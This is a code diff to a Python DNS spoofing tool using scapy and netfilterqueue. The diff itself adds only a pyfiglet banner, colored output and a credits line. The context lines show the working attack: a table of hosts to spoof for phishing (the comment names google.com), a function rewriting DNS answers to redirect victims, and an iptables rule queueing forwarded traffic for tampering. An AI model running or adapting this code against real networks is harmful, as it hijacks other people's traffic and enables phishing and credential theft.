@@ -18,6 +18,7 @@
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
+import pyfiglet
 
 # DNS host records, for instance here, we want to spoof google.com
 dns_hosts = {
@@ -33,13 +34,13 @@ def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
         # If it's a DNS Packet : we modify it
-        print("[BEFORE]:", scapy_packet.summary())
+        print("\033[1;31m[BEFORE]:", scapy_packet.summary())
         try:
             scapy_packet = modify_packet(scapy_packet)
         except IndexError:
             # No UDP packet, they can be IP/UDP error packets.
             pass
-        print("[AFTER]:", scapy_packet.summary())
+        print("\033[1;32m[AFTER]:", scapy_packet.summary())
         # returned as a netfilter queue packet
         packet.set_payload(bytes(scapy_packet))
     # accept the packet
@@ -56,7 +57,7 @@ def modify_packet(packet):
     qname = packet[DNSQR].qname
     if qname not in dns_hosts:
         # If the site is not in our list of sites to phisher, we do not modify it
-        print("NO MODIF", qname)
+        print("\033[1;33m[-] NO MODIF", qname)
         return packet
     # create a new response, replacing the original response
     # set the rdata for the IP we want to redirect (spoofed)
@@ -76,6 +77,10 @@ def modify_packet(packet):
 
 
 if __name__ == "__main__":
+    header = pyfiglet.figlet_format("DNS Spoofer", font = "slant")
+    print("\033[1;31m"+header)
+    print("© All credits to NextGenSpoofer  \n")
+    print("Don't forget to change the source code for dns_hosts")
     QUEUE_NUM = 0
     # insert iptables FORWARD rule
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
